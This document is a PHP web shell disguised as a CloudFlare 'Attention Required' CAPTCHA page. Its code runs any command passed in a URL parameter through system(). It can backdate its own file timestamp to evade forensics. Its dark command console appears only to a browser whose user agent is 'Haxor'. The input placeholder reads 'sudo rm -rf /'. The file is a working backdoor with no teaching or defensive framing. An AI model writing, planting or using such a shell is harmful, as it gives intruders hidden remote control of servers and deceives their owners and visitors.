<?php
	error_reporting(E_ALL);
	
	$ip = $_SERVER['SERVER_ADDR'];
	$port = $_SERVER['SERVER_PORT'];
	$file = basename(__FILE__); 
	$connectstr = "http://".$ip.":".$port."/".$file;

	class UserInterface
	{
		public $pwd = "";
		private $currentUser = "";
		private $mode = "r";
		private $errorToo = '2>&1';
		private $command = "";

		public function doCommand($command)
		{
			return system($command." 2>&1");
		}
		
		public function getPwd()
		{
			$this->doCommand("/bin/pwd");
		}

		public function cd($path)
		{
			chdir($path);
		}

		public function timeStamp($stamp)
		{
			$nothing = popen("touch " . __FILE__ . " -t {$stamp}",$this->mode);
		}
	}

	$userInterface = new UserInterface();
?>


<?php if (isset($_GET['command']) || isset($_GET['shellCommand'])): ?>
<?php
	if(isset($_GET['command'])) {
		$command = $_GET['command'];
		switch($command) {
			case "pwd":
				$userInterface->getPwd();
				break;
			case "perm":
				$permissions = $userInterface.getPermissions();
				break;
			case "ps":
				$processes = $userInterface.getProcesses();
				break;
		}
	}
	
	if(isset($_GET['shellCommand'])) {
		$myCommand = $_GET['shellCommand'];
		$shellOut = $userInterface->doCommand($myCommand);
	}


?>
<?php else: ?>

<div id="luserContent">
<!DOCTYPE html>
<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]--><!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]--><!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en-US"> <!--<![endif]-->
<head>
<title>Attention Required! | CloudFlare</title>
<meta charset="UTF-8">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
<meta name="robots" content="noindex, nofollow">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<link rel="stylesheet" id="cf_styles-css" href="http://git.0x00sec.org/cdn-cgi/styles/cf.errors.css" type="text/css" media="screen,projection">
<!--[if lt IE 9]><link rel="stylesheet" id='cf_styles-ie-css' href="/cdn-cgi/styles/cf.errors.ie.css" type="text/css" media="screen,projection" /><![endif]-->
<style type="text/css">body{margin:0;padding:0}</style>
<!--[if lte IE 9]><script type="text/javascript" src="/cdn-cgi/scripts/jquery.min.js"></script><![endif]-->
<!--[if gte IE 10]><!--><script type="text/javascript" src="http://git.0x00sec.org/cdn-cgi/scripts/zepto.min.js"></script><!--<![endif]-->
<script type="text/javascript" src="http://git.0x00sec.org/cdn-cgi/scripts/cf.common.js"></script>


</head>
<body>
  <div id="cf-wrapper">
    <div class="cf-alert cf-alert-error cf-cookie-error" id="cookie-alert" data-translate="enable_cookies">Please enable cookies.</div>
    <div id="cf-error-details" class="cf-error-details-wrapper">
      <div class="cf-wrapper cf-header cf-error-overview">
        <h1 data-translate="challenge_headline">One more step</h1>
        <h2 class="cf-subheadline">
<span data-translate="complete_sec_check">Please complete the security check to access</span> git.0x00sec.org</h2>
      </div>
<!-- /.header -->

      <div class="cf-section cf-highlight cf-captcha-container">
        <div class="cf-wrapper">
          <div class="cf-columns two">
            <div class="cf-column">
              <div class="cf-highlight-inverse cf-form-stacked">
                <form class="challenge-form" id="challenge-form" action="/cdn-cgi/l/chk_captcha" method="get">
  <script type="text/javascript" src="http://git.0x00sec.org/cdn-cgi/scripts/cf.challenge.js" data-type="normal" data-ray="3180847a262311d7" async data-sitekey="6LfOYgoTAAAAAInWDVTLSc8Yibqp-c9DaLimzNGM" data-stoken="Iy2lFLt3tcY2ZFmRnczvzUSRp9xbP5dO2g8oVbs-84MV7yoHpkpSJhEm06noTXzWTLN2dMMWn05lCSHa4qZxjpTKQ-A0tdIRBCqHR7xLnFc"></script>
  <div class="g-recaptcha"></div>
  <noscript id="cf-captcha-bookmark" class="cf-captcha-info">
    <div><div style="width: 302px">
      <div>
        <iframe src="https://www.google.com/recaptcha/api/fallback?k=6LfOYgoTAAAAAInWDVTLSc8Yibqp-c9DaLimzNGM&amp;stoken=Iy2lFLt3tcY2ZFmRnczvzUSRp9xbP5dO2g8oVbs-84MV7yoHpkpSJhEm06noTXzWTLN2dMMWn05lCSHa4qZxjpTKQ-A0tdIRBCqHR7xLnFc" frameborder="0" scrolling="no" style="width: 302px; height:422px; border-style: none;"></iframe>
      </div>
      <div style="width: 300px; border-style: none; bottom: 12px; left: 25px; margin: 0px; padding: 0px; right: 25px; background: #f9f9f9; border: 1px solid #c1c1c1; border-radius: 3px;">
        <textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid #c1c1c1; margin: 10px 25px; padding: 0px; resize: none;"></textarea>
        <input type="submit" value="Submit">
      </div>
    </div></div>
  </noscript>
</form>

              </div>
            </div>

            <div class="cf-column">
              <div class="cf-screenshot-container">
              
                <span class="cf-no-screenshot"></span>
              
              </div>
            </div>
          </div>
<!-- /.columns -->
        </div>
      </div>
<!-- /.captcha-container -->

      <div class="cf-section cf-wrapper">
        <div class="cf-columns two">
          <div class="cf-column">
            <h2 data-translate="why_captcha_headline">Why do I have to complete a CAPTCHA?</h2>

            <p data-translate="why_captcha_detail">Completing the CAPTCHA proves you are a human and gives you temporary access to the web property.</p>
          </div>

          <div class="cf-column">
            <h2 data-translate="resolve_captcha_headline">What can I do to prevent this in the future?</h2>

            <p data-translate="resolve_captcha_antivirus">If you are on a personal connection, like at home, you can run an anti-virus scan on your device to make sure it is not infected with malware.</p>

            <p data-translate="resolve_captcha_network">If you are at an office or shared network, you can ask the network administrator to run a scan across the network looking for misconfigured or infected devices.</p>
          </div>
        </div>
      </div>
<!-- /.section -->

      <div class="cf-error-footer cf-wrapper">
  <p>
    <span class="cf-footer-item">CloudFlare Ray ID: <strong>3180847a262311d7</strong></span>
    <span class="cf-footer-separator">•</span>
    <span class="cf-footer-item"><span data-translate="your_ip">Your IP</span>: 65.19.167.132</span>
    <span class="cf-footer-separator">•</span>
    <span class="cf-footer-item"><span data-translate="performance_security_by">Performance &amp; security by</span> <a data-orig-proto="https" data-orig-ref="www.cloudflare.com/5xx-error-landing?utm_source=error_footer" id="brand_link" target="_blank">CloudFlare</a></span>
    
  </p>
</div>
<!-- /.error-footer -->


    </div>
<!-- /#cf-error-details -->
  </div>
<!-- /#cf-wrapper -->

  <script type="text/javascript">
  window._cf_translation = {};
  
  
</script>

</body>
</html>

</div>


<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

<div id="haxored" hidden="true">

<style rel="stylesheet" type="text/css">
#XmenuNav {
	background-color: #161616;
	float: center;
	width: 100%;
	height: 7%;
}

#menuNav ul {
	float: center;
}

#XmenuNav ul li {
	list-style-type: none;
	display: inline;
}

#XmenuNav #home {
	background-color: #2d2d2d;
	color: #fff;
	border: 0px;
}


#XmenuNav li button {
	height: 100%;
	border: 0px;
	padding: 0 10px;	
	float: left;
	color: #605e56;
	background-color: #161616;
}

#XmenuNav li button:hover {
	background-color: #2d2d2d;
	color: #fff;
	border: 0px;
}

#XmenuStats ul li {
	color: #cad0c4;
	float: right;
	padding: 12px 10px;
	margin-right: 30px;
}

#XmainShell {
	height: 90%;
	padding: 20px 0px;
	margin: 0px;
	background-color: #1f1f1f;
	color: #fff;
	width: 100%;
}

#XinputShell {
	margin-left: 3%;
	margin-right: 3%;
	padding-left: 2%;
	padding-right: 2%;
}


#XinputShell input {
	width: 100%;
	height: 50px;
	border: 0px;
	outline: none;
	padding-left: 10px;
	font-family: monospace;
	font-size: 15px;
	color: #cad0c4;
	background-color: #323232;
}

#XShellContainer {
	margin-top: 2%;
	margin-left: 5%;
	margin-right:5%;
	padding-left: 2%;
	padding-right: 0px;
	background-color: #2d2d2d;
	height: 80%;
}

#XShellOutput {
	height: 100%;
	width: 100%;
	overflow: auto;
	font-family: monospace;
	padding-top: 15px;
}


#XShellOutput pre {
	display: inline;
}

#XShellOutput .command {
	color: #1793d1;
}

#XShellOutput .output {
	color: #cad0c4;
	padding-bottom:40px;
}

</style>
<div id="Xcontainer">
	<div id="XmenuNav">
		<form action="" id="XmenuForm">
		<ul class="XmenuOptions">
			<li><button id="home"> Home </button></li>
			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
			<li><button id="XbuttonPerm" name="command" value="whoami">Permissions</button></li>
			<li><button id="XbuttonPs" name="command" value="ps">Processes</button></li>
			<li><button id="XbuttonIfconfig" name="command" value="ifconfig">Networking</button></li>
		</ul>
		<div id="XmenuStats">
			<ul>
				<li id="XPHPversion"> PHP </li>
			</ul>
		</div>
		</form>
	<br>
	</div>
	<div id="XmainContainer">
		<div id="XmainShell">
			<div id="XShellContainer">
				<div id="XShellOutput">
				</div>
			</div>
			<div id="XinputShell">
				<input type="text" placeholder="sudo rm -rf /" id="shellInput">
			</div>
		</div>
	
	<script type="text/javascript">	
		$(document).ready( function() {

			var history = [];
			var counter = 0;

			function submit(command) {
				history.push(command);
				$.ajax({
					url: "<?php echo $connectstr; ?>",
					type: "GET",
					data: {"shellCommand": command},
					success: function(data) {
					renderCmd(command, data)
				}
			});
		}

		var user = "badass";
		var hostname = "microserver";

		function renderCmd(command, output) {
			var time = new Date().toLocaleTimeString('en-GB', { hour: "numeric", minute: "numeric"});
			$("#XShellOutput").append("<pre class='command'>" + time + " "+ user + "@" + hostname + " $ " + command + "</pre>");
			$("#XShellOutput").append("<pre class='output'>" + output + "</pre>");
			$("#XShellOutput").scrollTop($("#XShellOutput")[0].scrollHeight);
		}
	
		var request = "";

	
		$("#XbuttonPwd").on('click', function(e) {
			e.preventDefault();
			request = "pwd";
			submit(request);
		});

		$("#XbuttonPerm").on('click', function(e) {
			e.preventDefault();
			request = "perm";
			submit(request);
		});

		$("#XbuttonPs").on('click', function(e) {
			e.preventDefault();
			request = "ps";
			submit(request);
		});


		$("#XbuttonIfconfig").on('click', function(e) {
			e.preventDefault();
			request = "ifconfig";
			submit(request);
		});

		var inputshell = document.getElementById("XinputShell");
		inputshell.addEventListener("keydown", function(e) {
			if (e.which == 13) {
				submit($("#shellInput").val());
				$("#shellInput").val("");
			}
		
			if (e.which == 38 && counter < history.length) {
				counter += 1;
			
				$("#shellInput").val(history[history.length - counter]);
			}

			if (e.which == 40 && counter > 0) {
				counter -= 1;
				$("#shellInput").val(history[history.length - counter]);
			}

			if (e.keyCode == 90 && e.ctrlKey) {
				$("#XShellOutput").empty();
			}
		});

		$("#XPHPversion").text("<?php echo 'Current PHP Version: ' . phpversion(); ?>");
	});

	$(document).ready(function() {
		if(navigator.userAgent == "Haxor") {
			console.log("Hello Master.")
			$("body").css({"margin":"0px"});
			$("#luserContent").remove();
			$("#haxored").prop("hidden", false);
		} else {
			console.log("#");	
			$("#haxored").remove();
		}
	});
</script>
</div>
<!-- Below here should be the closing </body> tag -->
<?php endif; ?>

